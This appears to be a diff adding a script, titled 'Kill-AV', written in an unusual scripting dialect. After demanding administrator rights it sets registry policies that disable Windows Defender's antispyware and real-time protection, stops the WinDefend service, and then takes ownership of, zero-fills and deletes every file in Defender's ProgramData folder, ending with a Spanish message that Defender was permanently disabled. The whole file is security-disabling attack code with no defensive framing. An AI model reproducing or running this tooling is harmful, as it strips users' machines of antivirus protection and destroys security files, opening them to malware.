@@ -1,0 +1,41 @@
+@Config.lib -include "ADZP 20 Complex.sys"
+import "MS-DOS Batch" Service-Host "sc" EscStr[Off] true
+import "MS-DOS Batch" Takeown-File "takeown" EscStr[Off] true
+import "MS-DOS Batch" Icacls-Control "icacls" EscStr[Off] true
+
+$ZScript.AdjustPrivilege ADMINISTRATOR_PRIVILEGE_LEVEL 1
+   #If /s "%ExecutionPrivilege%" equ "user" then $ZScript.End
+   #If /s "%ExecutionPrivilege%" equ "administrator" then {NULL}
+
+$ZScript.ReturnBucle Main
+
+void -f.TakeOwnerShip- pFile
+   Takeown-File /f "!pFile!"
+   Icacls-Control "!pFile!" /reset /c /q
+   $ZScript.CreateFile [MODIFY_ATTRIBUTES] -r -a -s -h "!pFile!"
+@System.EndSub
+
+void -f.DestroyFile- pFile
+   #Plc.CallFunction f.TakeOwnerShip "!pFile!"
+   $ZScript.CreateFile [ZERO_DATA] "!pFile!"
+   $ZScript.DeleteFile "!pFile!"
+@System.EndSub
+   
+ScriptingBucle.(DestroyFunction)
+   #Plc.CallFunction f.DestroyFile "!file_name!"
+@System.EndBuc
+
+(Main)
+
+   $ZScript.RegEdit -add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" DisableAntiSpyware REG_DWORD 1
+   $ZScript.RegEdit -add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" DisableBehaviorMonitoring REG_DWORD 1
+   $ZScript.RegEdit -add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" DisableOnAccessProtection REG_DWORD 1
+   $ZScript.RegEdit -add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" DisableScanOnRealtimeEnable REG_DWORD 1
+   $ZScript.RegEdit -add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" DisableRealtimeMonitoring REG_DWORD 1
+   Service-Host stop WinDefend
+
+   #For "%ProgramData%\Microsoft\Windows Defender\" DestroyFunction /r file_name *.*
+
+   $ZScript.MessageBox Warning "Windows Defender fue desactivado permanentemente" "Kill-AV" OK
+
+$ZScript.End
